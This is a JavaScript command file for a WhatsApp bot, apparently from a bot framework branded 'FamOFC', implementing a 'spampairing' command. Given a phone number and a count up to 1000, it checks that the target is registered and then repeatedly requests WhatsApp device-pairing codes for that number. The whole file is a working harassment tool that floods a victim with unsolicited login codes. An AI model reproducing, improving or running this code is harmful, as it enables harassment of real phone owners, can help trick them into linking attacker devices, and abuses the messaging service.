exports.run = {
   usage: ['spampairing'],
   use: 'number|count',
   category: 'owner',
   async: async (m, {
      client,
      text,
      command,
      isOwner,
      users,
      prefix,
      Func
   }) => {
      try {
         // Check permissions - only owner and premium users
         if (!isOwner && !users.premium) {
            return client.reply(m.chat, '❌ *This feature is exclusive to Premium users and Owners!*', m)
         }

         // Check if text is provided
         if (!text) {
            return client.reply(m.chat, `📌 *Usage:* ${prefix + command} <number>|<count>\nExample: ${prefix + command} +923312345678|150\n\n🔥 *Powered by FamOFC*`, m)
         }

         // Send processing reaction
         await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

         // Parse input
         let [target, count = "200"] = text.split("|")
         target = target.replace(/[^0-9]/g, '').trim()
         
         // Validate phone number
         if (!/^\d{10,13}$/.test(target)) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
            return client.reply(m.chat, `❌ Invalid phone number! Example: +923312345678`, m)
         }

         // Check if number is registered on WhatsApp
         let ceknya = await client.onWhatsApp(target + '@s.whatsapp.net')
         if (ceknya.length == 0) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
            return client.reply(m.chat, `❌ Enter a valid number registered on WhatsApp!`, m)
         }

         // Import required modules
         const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
         const { state } = await useMultiFileAuthState('pepek')
         const { version } = await fetchLatestBaileysVersion()
         const pino = require("pino")
         const colors = require('@colors/colors')
         const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

         // Validate count
         count = parseInt(count)
         if (isNaN(count) || count <= 0) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
            return client.reply(m.chat, `❌ Invalid count! Please provide a positive number.`, m)
         }

         // Safety limit to prevent abuse
         if (count > 1000) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
            return client.reply(m.chat, `❌ Count too high! Maximum allowed is 1000.`, m)
         }

         // Start spamming
         client.reply(m.chat, `✅ *Processing spam pairing for ${target} (${count} times)...*`, m)

         for (let i = 0; i < count; i++) {
            await Func.delay(1500) // Use existing delay function
            let prc = await sucked.requestPairingCode(target)
            console.log(colors.bgGreen.black(`_Success Spam Pairing Code - Number: ${target} - Code: ${prc}_`))
         }

         await Func.delay(15000)
         await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
         client.reply(m.chat, `✅ *Successfully sent ${count} pairing codes to ${target}!*\n\n🔥 *Powered by FamOFC*`, m)
      } catch (error) {
         console.error("SpamPairing Error:", error.message)
         await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
         client.reply(m.chat, `❌ *Error:* Failed to send pairing codes. ${error.message || 'Please try again later.'}\n\n🔥 *Powered by FamOFC*`, m)
      }
   },
   owner: true,
   error: false
}